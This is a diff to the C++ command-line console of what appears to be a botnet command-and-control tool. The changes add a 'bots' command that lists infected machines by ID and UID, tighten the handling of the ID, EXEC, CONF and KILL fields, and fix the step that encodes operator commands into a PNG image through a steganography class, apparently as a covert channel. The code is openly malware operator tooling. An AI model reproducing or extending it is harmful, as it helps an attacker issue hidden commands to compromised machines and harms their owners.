@@ -2,18 +2,42 @@
 
     void cli::setAttr (cli *cliInstance){
             if(cliInstance->input[1] == "ID"){
-                cliInstance->id = cliInstance->input[2];
+                cliInstance->id.clear();
+                //Validate argument is available
+                if(cliInstance->input.size() <3){
+                    return;
+                }
+                if(cliInstance->input[2] == "ALL"){
+                    cliInstance->id = "ALL";
+                }else{
+                    //Dont feel like using regex to validate user input for stoi and find, just ganna catch any exceptions
+                    try{
+                        cliInstance->id = bots.find(stoi(cliInstance->input[2]))->second;
+                    }catch(const std::invalid_argument &e){
+                        std::cout << "Error,Invalid argument for ID. ID must be an integer" << std::endl;
+                    }
+                }
             }else if(cliInstance->input[1] == "EXEC"){
                 //For statement to store entire command in EXEC.
-                for (int i = 2; i <= cliInstance->input.size(); i++){
+                cliInstance->Exec.clear();
+                for (int i = 2; i < cliInstance->input.size(); i++){
                   cliInstance->Exec += cliInstance->input[i] + " ";
                 }
             }else if(cliInstance->input[1] == "CONF"){
+                cliInstance->Conf.clear();
+                if(cliInstance->input.size() <3){
+                    return;
+                }
                 cliInstance->Conf = cliInstance->input[2];
             }else if(cliInstance->input[1]== "KILL"){
+                cliInstance->Kill.clear();
+                if(cliInstance->input.size() <3){
+                    return;
+                }
                 cliInstance->Kill = cliInstance->input[2];
             }else{
-                fprintf(stdout,"Error, Invalid command\n");
+                std::cout << "Error: Invalid Command" << std::endl;
+
             }
     }
 
@@ -52,15 +76,35 @@
             std::string dImage = "images/defaultR.png";                  
             std::string wImage = "images/tree.png"; 
             stegImage encodeImage;
-            encodeImage.readPNG(&dImage,commandParser);   
+            encodeImage.readPNG(&dImage);  
+            encodeImage.encodeImage(commandParser); 
             encodeImage.writePNG(&wImage);
     }
+   void cli::showBots(cli *cliInstance){
+        if(bots.empty()){
+            std::cout << "Bots: 0" << std::endl;
+        }else{
+            std::cout << "Bots: " << bots.size() << std::endl;
+            std::map<int,std::string>::iterator it = bots.begin();
+            std::cout << "ID" << "              " << "UID" << std::endl;
+            std::cout << "--" << "              " << "---" << std::endl;
+
+            while(it != bots.end()){
+                std::cout << it->first << ":              "<< it->second << std::endl;
+                it++;
+            }
+        }
+    
+    }
+    
 
     void cli::call_command(cli *cliInstance){
         auto iter = cliInstance->map.find(cliInstance->input[0]);
         //If valid command is found, execute it
         if(iter != cliInstance->map.end()){
             (*iter->second)(cliInstance);
+        }else{
+            std::cout << "Error: Invalid Command" << std::endl;
         }
     }
     
@@ -69,6 +113,7 @@
         cliInstance->map.emplace("set",&setAttr);
         cliInstance->map.emplace("show",&showInfo);
         cliInstance->map.emplace("run", &runCommand);
+        cliInstance->map.emplace("bots",&showBots);
   
     }
 
@@ -85,8 +130,8 @@
         return 0;
     }
     
-    void *cli::cliPerform(void *params){
-        cli *cliInt = (cli *)params;
+    void cli::cliPerform(cli *cliInt){
+       
 
         while(true){
             std::string command;
@@ -96,11 +141,12 @@
             cliInt->input.clear();
             //Parse Command for fields
             if(cliInt->parseCommand(command)){
-                fprintf(stdout,"Error: Invalid Syntex\n");
+                std::cout << "Error: Invalid Syntex" << std::endl;
+                cliInt->input.clear();
                 continue;
             }
             cliInt->call_command(cliInt);
-
+            cliInt->input.empty();
         }
    
     }
